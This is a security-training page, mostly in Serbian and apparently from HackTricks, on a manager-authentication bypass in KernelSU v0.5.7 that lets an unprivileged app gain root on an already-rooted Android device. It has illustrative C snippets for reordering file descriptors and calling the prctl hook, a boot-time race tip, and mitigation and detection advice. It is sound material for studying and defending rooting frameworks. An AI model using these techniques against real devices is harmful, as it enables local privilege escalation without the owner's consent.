# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks kao što su KernelSU, APatch, SKRoot i Magisk često patch-uju Linux/Android kernel i izlažu privilegovanu funkcionalnost neprivilegovanom userspace „manager“ app-u putem hook-ovanog syscall-a. Ako je korak autentifikacije manager-a neispravan, bilo koja lokalna app može pristupiti ovom kanalu i eskalirati privilegije na uređajima koji su već root-ovani.

Ova stranica predstavlja apstrakciju tehnika i propusta otkrivenih u javnim istraživanjima (naročito Zimperium-ovoj analizi KernelSU v0.5.7), kako bi red i blue timovi razumeli attack surface, exploitation primitive i robusne mitigacije.<sup>[[1]](#references)</sup>

---
## Arhitektonski obrazac: syscall-hooked manager kanal

- Kernel modul/patch hook-uje syscall (najčešće prctl) kako bi primao „komande“ iz userspace-a.
- Protokol je obično: magic_value, command_id, arg_ptr/len ...
- Userspace manager app se prvo autentifikuje (npr. CMD_BECOME_MANAGER). Kada kernel označi pozivaoca kao trusted manager, privilegovane komande se prihvataju:
- Dodeli root pozivaocu (npr. CMD_GRANT_ROOT)
- Upravljaj allowlist/deny-list listama za su
- Prilagodi SELinux policy (npr. CMD_SET_SEPOLICY)
- Prikaži verziju/konfiguraciju
- Pošto bilo koja app može pozivati syscall-ove, ispravnost autentifikacije manager-a je kritična.

Primer (KernelSU dizajn):
- Hook-ovani syscall: prctl
- Magic vrednost za preusmeravanje ka KernelSU handler-u: 0xDEADBEEF
- Komande uključuju: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, itd.

---
## KernelSU v0.5.7 tok autentifikacije (kako je implementiran)

Kada userspace pozove prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU proverava:

1) Provera prefiksa putanje
- Prosleđena putanja mora počinjati očekivanim prefiksom za UID pozivaoca, npr. /data/data/<pkg> ili /data/user/<id>/<pkg>.
- Referenca: core_hook.c (v0.5.7) logika provere prefiksa putanje.<sup>[[2]](#references)</sup>

2) Provera vlasništva
- Vlasnik putanje mora biti UID pozivaoca.
- Referenca: core_hook.c (v0.5.7) logika vlasništva.<sup>[[2]](#references)</sup>

3) Provera APK potpisa putem skeniranja FD tabele
- Iterira se kroz otvorene file descriptor-e procesa koji poziva.
- Bira se prvi file čija putanja odgovara /data/app/*/base.apk.
- Parsira se APK v2 potpis i proverava u odnosu na zvanični sertifikat manager-a.
- Reference: manager.c (iteriranje kroz FD-ove), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

Ako sve provere prođu, kernel privremeno kešira UID manager-a i prihvata privilegovane komande od tog UID-a do resetovanja.

---
## Klasa ranjivosti: verovanje „prvom odgovarajućem APK-u“ iz FD iteracije

Ako se provera potpisa vezuje za „prvi odgovarajući /data/app/*/base.apk“ pronađen u FD tabeli procesa, ona zapravo ne proverava sopstveni package pozivaoca. Attacker može unapred pozicionirati legitimno potpisan APK (pravi manager) tako da se u FD listi pojavi pre njegovog sopstvenog base.apk fajla.

Ovo trust-by-indirection omogućava neprivilegovanoj app da impersonira manager bez posedovanja manager-ovog signing key-a.<sup>[[1]](#references)</sup>

Ključna svojstva koja se iskorišćavaju:<sup>[[1]](#references)</sup>
- FD scan nije povezan sa identitetom package-a pozivaoca; on samo proverava string pattern putanje.
- open() vraća najniži dostupan FD. Zatvaranjem FD-ova sa manjim brojevima attacker može kontrolisati redosled.
- Filter proverava samo da putanja odgovara /data/app/*/base.apk – ne proverava da li ona odgovara instaliranom package-u pozivaoca.

---
## Preduslovi za attack

- Uređaj je već root-ovan pomoću ranjivog rooting framework-a (npr. KernelSU v0.5.7).
- Attacker može lokalno izvršavati proizvoljan neprivilegovan kod (Android app proces).
- Pravi manager se još nije autentifikovao (npr. neposredno nakon reboot-a). Neki framework-ovi keširaju UID manager-a nakon uspeha; potrebno je pobediti u race-u.<sup>[[1]](#references)</sup>

---
## Pregled exploitation-a (KernelSU v0.5.7)

Koraci visokog nivoa:<sup>[[1]](#references)[[9]](#references)</sup>
1) Napravi validnu putanju do sopstvenog app data direktorijuma kako bi zadovoljio provere prefiksa i vlasništva.
2) Obezbedi da se originalni KernelSU Manager base.apk otvori na FD-u sa manjim brojem od FD-a sopstvenog base.apk fajla.
3) Pozovi prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) kako bi provere prošle.
4) Pošalji privilegovane komande kao što su CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY da bi se elevation zadržao.

Praktične napomene za korak 2 (FD ordering):<sup>[[1]](#references)</sup>
- Identifikuj FD svog procesa za sopstveni /data/app/*/base.apk prolaskom kroz /proc/self/fd symlink-ove.
- Zatvori FD sa malim brojem (npr. stdin, fd 0) i prvo otvori legitimni manager APK tako da zauzme fd 0 (ili bilo koji indeks manji od FD-a sopstvenog base.apk fajla).
- Uključi legitimni manager APK u svoju app tako da njegova putanja zadovolji naivni filter kernela. Na primer, postavi ga pod subpath koji odgovara /data/app/*/base.apk.

Primeri code snippet-a (Android/Linux, samo ilustrativno):

Enumeriši otvorene FD-ove kako bi pronašao base.apk unose:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Prisilite FD sa manjim brojem da pokazuje na legitimni manager APK:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Autentikacija managera putem prctl hook-a:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
After success, privileged commands (examples):
- CMD_GRANT_ROOT: unaprediti trenutni proces u root
- CMD_ALLOW_SU: dodati svoj package/UID na allowlist za persistent su
- CMD_SET_SEPOLICY: prilagoditi SELinux policy u meri u kojoj framework to podržava

Race/persistence tip:
- Registrovati BOOT_COMPLETED receiver u AndroidManifest (RECEIVE_BOOT_COMPLETED) kako bi se proces pokrenuo rano nakon reboot-a i pokušao authentication pre pravog manager-a.<sup>[[1]](#references)</sup>

---
## Smernice za detekciju i ublažavanje

Za developere framework-a:
- Povežite authentication sa package/UID-om pozivaoca, a ne sa proizvoljnim FD-ovima:
- Razrešite package pozivaoca na osnovu njegovog UID-a i proverite ga u odnosu na signature instaliranog package-a (putem PackageManager-a), umesto skeniranja FD-ova.
- Ako se koristi samo kernel, upotrebite stabilan identitet pozivaoca (task creds) i validirajte ga u odnosu na stabilan autoritativni izvor podataka kojim upravlja init/userspace helper, a ne u odnosu na FD-ove procesa.
- Izbegavajte provere prefiksa putanje kao identiteta; pozivalac ih može trivijalno ispuniti.
- Koristite challenge–response zasnovan na nonce-u preko kanala i obrišite svaki keširani identitet manager-a pri boot-u ili tokom ključnih događaja.
- Razmotrite authenticated IPC zasnovan na binder-u umesto preopterećivanja generičkih syscall-ova kada je to izvodljivo.

Za defendere/blue team:
- Detektujte prisustvo rooting framework-a i manager procesa; nadgledajte prctl pozive sa sumnjivim magic constants (npr. 0xDEADBEEF) ako imate kernel telemetriju.
- Na upravljanim flotama blokirajte ili prijavite boot receiver-e iz nepouzdanih package-ova koji brzo nakon boot-a pokušavaju privilegovane manager komande.
- Obezbedite da su uređaji ažurirani na zakrpljene verzije framework-a; poništite keširane ID-jeve manager-a nakon update-a.

Ograničenja attack-a:
- Utiče samo na uređaje koji su već root-ovani ranjivim framework-om.
- Obično zahteva reboot/race window pre nego što se legitimni manager autentifikuje (neki framework-ovi keširaju UID manager-a dok se ne izvrši reset).

---
## Povezane napomene kroz framework-ove

- Password-based auth (npr. istorijski APatch/SKRoot build-ovi) može biti slaba ako se password-i mogu pogoditi/bruteforce-ovati ili ako su validacije neispravne.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-based auth (npr. KernelSU) je u principu jača, ali mora biti povezana sa stvarnim pozivaocem, a ne sa indirektnim artefaktima kao što je skeniranje FD-ova.<sup>[[1]](#references)[[5]](#references)</sup>
- Magisk: CVE-2024-48336 (MagiskEoP) je pokazao da čak i zreli ekosistemi mogu biti podložni spoofing-u identiteta koji dovodi do izvršavanja koda sa root privilegijama unutar konteksta manager-a.<sup>[[1]](#references)[[8]](#references)</sup>

---
## References

- [1] [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [3] [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [4] [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [9] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
